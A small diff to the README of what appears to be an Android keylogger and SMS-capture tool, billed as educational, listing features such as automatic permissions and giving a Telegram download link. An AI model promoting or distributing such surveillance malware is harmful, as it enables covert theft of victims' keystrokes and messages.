@@ -13,7 +13,7 @@ Android KeyLogger and SMS Capture (software is meant for educational)
 * Auto Permissions
 * ~~AntiUninstall~~
 ## [Download][
-https://t.me/irarechannel/67)
+https://t.me/irarechannel/67
 
 ## Requisites
 * .NET Framework 4.8
